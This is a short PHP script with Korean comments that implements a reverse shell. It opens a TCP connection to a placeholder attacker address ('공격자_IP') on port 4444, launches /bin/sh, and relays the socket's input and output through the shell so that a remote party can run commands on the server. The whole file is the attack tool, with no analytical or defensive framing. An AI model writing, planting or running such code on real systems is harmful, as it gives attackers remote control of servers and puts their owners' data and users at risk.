<?php
// 공격자(Listener)의 IP와 포트를 설정합니다.
$ip = '공격자_IP';
$port = 4444;

// 소켓을 생성하고 TCP 연결을 시도합니다.
$sock = fsockopen($ip, $port);

if ($sock) {
    // 0: 표준 입력, 1: 표준 출력, 2: 표준 에러를 소켓에 연결
    $descriptorspec = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w")
    );
    
    // 시스템 쉘(sh 또는 bash) 프로세스를 실행합니다.
    $process = proc_open('/bin/sh', $descriptorspec, $pipes);

    if (is_resource($process)) {
        // 소켓의 입력/출력을 쉘과 매핑하여 명령을 주고받습니다.
        while (!feof($sock)) {
            $read = array($sock);
            $write = null;
            $except = null;

            stream_select($read, $write, $except, null);

            if (in_array($sock, $read)) {
                $input = fread($sock, 1024);
                fwrite($pipes[0], $input);
            }

            $output = fread($pipes[1], 1024);
            fwrite($sock, $output);
        }
        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
    }
    fclose($sock);
}
?>

